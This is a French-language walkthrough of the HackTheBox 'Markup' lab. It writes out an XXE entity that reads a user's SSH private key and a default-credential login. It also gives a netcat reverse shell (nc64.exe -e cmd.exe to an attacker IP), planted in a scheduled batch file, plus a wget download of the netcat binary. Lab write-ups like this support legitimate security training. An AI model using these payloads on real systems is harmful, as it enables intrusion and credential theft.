## Lab Title: Markup
- Date: 01-10-2025
- Duration: ~120 minutes

### Platform: HTB – Starting Point > Tier 2

### 1. Scenario Summary
1. Une exploitation de **XXE** vulnérabilité
2. Obtenir SSH connexion avec la **clé privée de SSH**
2. **Reverse Shell** par `.bat` fichier.

### 2. Findings
**Enumeration:**
1. Comme d'habitude, on utilise: `nmap`
    - `nmap -Pn -sV $ip` pour trouver les services actuels et leur versions.
    ```code
        22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
        80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
        443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
    ```
2. Parmi ces informations, l'Apache est intéressant pour nous.
    - Quand on a trouvé le site Web: il y a un site avec les options pour faire `login`
    - Et comme d'habitude, on essai avec les informations d'identification par defaut:
    - `https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown`
    - Et on a trouvé: `admin:password` fonctionne bien.

3. Quand on a analysé le site Web >> on a trouvé que le site accepte l'input de l'utilisateur par **Order** fonction.


4. Après, on a analysé `Source Code` et trouvé que **XML a une version**: `XML 1.0`
    - On connaît que `XML` est utilisé comme un standard pour `data representation`

5. Parmi les vulnérabilités, le meilleur est **XXE attaque** >> *XML External Entity* attaque
    - Cette attaque est utilisé pour obtenir les données privées et confidentielles tels que: `/etc/passwd` et `/etc/shadow`
    - Ici, si le **XML parser** est mal-configuré sur le serveur >> il est vulnérable
    - Quand même, c'est possible de faire `data exfiltration` avec cette vulnérabilité.

**Foothold:**
6. Quand on a analysé le code de l'HTML sur le site: on a trouvé cette ligne: `<!-- Modified by Daniel : UI-Fix-9092-->`
    - ça veut dire que l'utilisateur: `Daniel` existe dans le systeme, peut-être
    - On pense que `daniel` a les privilèges pour modifier le code source du site Web
    - Maintenant, on essai trouver le fichier: `.ssh/id_rsa` de Daniel.
    - Le but est de récupérer la **clé privée** de Daniel
        - `<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>`
    - Après cela, il nous donne **la clé privée SSH** de Daniel
    - On sauvera cela dans le nouveau fichier: `id_rsa` >> `touch id_rsa & nvim id_rsa`
    - Et exécuter cette commande: `ssh -i id_rsa daniel@10.129.122.232`
    - Voilà, on accéde à ce systeme >> et on peut trouver le drapeau sur le: `Desktop`

**Privilege Escalation**
7. On veut savoir quelles privilèges l'utilisateur, `daniel` a et donc on teste cette commande: `whoami /priv`
    - rien de spécial
    - Quand on a testé le fichier: `Log-Management/job.bat` >> on a trouvé quelque chose: **Log Cleaner**
    - Il y une application `wevtutil.exe`: *est un utilitaire en ligne de commande utilisé pour gérer les journaux d'événements Windows.*
    - Quand on a analysé `job.bat` par **icacls** >> on a trouvé que il est partie du groupe:
        **BULLETIN\Administrators** et **BULLETIN\Users** >> et voila
8. Maintenant, on peut modifier ce fichier et ajouter ce texte: `C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.52 2323`
    - Pour avoir `nc64.exe` >> on fait `http.server` de la machine attaquant et dans le machine victime, on change à `powershell` et de cette location, on fait:
        - `wget http://10.10.14.52:8000/nc64.exe`
    - Commande Complete: `echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.14.52 2323 > C:\LogManagement\job.bat`
    - Avec cela, on obtenira **reverse shell** >> Quand on fait `nc -lvnp 2323` dans la machine attaquant, on doit répéter quelque fois ça.

9. En fin, j'ai trouvé le drapeau du root: `Desktop/root.txt`

### 3. Idea
- C'est fou avec **XXE** attaque.
1. `ssh -i` >> `-i` pour définir *identity file*
2. **icacls** >> bon de vérifier les privilèges
3. `whomai /priv` >> bon de savoir
4. Trouver quelque fichier avec les privilèges completes avec **icacls** et modifier `job.bat` pour obtenir le `reverse shell`
